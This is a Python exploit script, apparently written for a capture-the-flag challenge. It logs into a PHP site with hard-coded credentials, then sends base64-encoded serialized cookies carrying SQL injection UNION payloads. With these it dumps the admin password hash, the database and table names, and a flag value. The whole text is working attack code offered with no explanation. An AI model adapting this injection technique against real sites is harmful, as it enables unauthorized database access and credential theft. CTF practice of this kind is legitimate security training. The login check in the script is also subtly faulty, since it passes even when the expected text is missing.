#!/usr/bin/env python3

import base64, requests, readline, code, re, warnings

warnings.filterwarnings('ignore')

url = 'http://doublesigma.cf:10204/cgsh_data_center/account.php'

# Login and get session id
r = requests.post(url, data={'username': 'erda', 'password': '2017bad'}, verify=False)

if r.text.find('Hello'):
    print('Login successfully')
else:
    exit()

session_id = r.cookies.get('PHPSESSID')
print('PHPSESSID:', session_id)

def userinfo(userid):
    serial = 'a:2:{s:2:"id";s:%s:"%s";s:8:"username";s:0:"";}'
    serial = serial % (len(userid), userid)
    return base64.b64encode(serial.encode()).decode()

def query(q):
    global session_id, url
    cookies = {
        'PHPSESSID': session_id,
        'USERINFO': userinfo(q)
        }
    return requests.get(url, cookies=cookies, verify=False).text

query('0 union select 1,2,3')

def ideq(q):
    regex = re.compile('\(id=(.+)\)')
    r = regex.search(query(q))
    try:
        return r.groups()[0]
    except:
        return None

# admin password md5 hash
result = ideq('0 union select password,2,3 from users where id=1')
print('admin\'s password md5 hash:', result)

# get database name
result = [ideq('''0 union 
select distinct table_schema,2,3
from information_schema.tables 
limit 1 offset %d''' % i) for i in range(5)]
print('databases:', result)

# get table names
result = [ideq('''0 union
select table_name,2,3
from information_schema.tables
where table_schema = 'exampleDB'
limit 1 offset %d''' % i) for i in range(10)]
print('tables in exampleDB:', result)

#get flag4
result = ideq('0 union select *,2,3 from flag4_is_here')
print('flag4:', result)
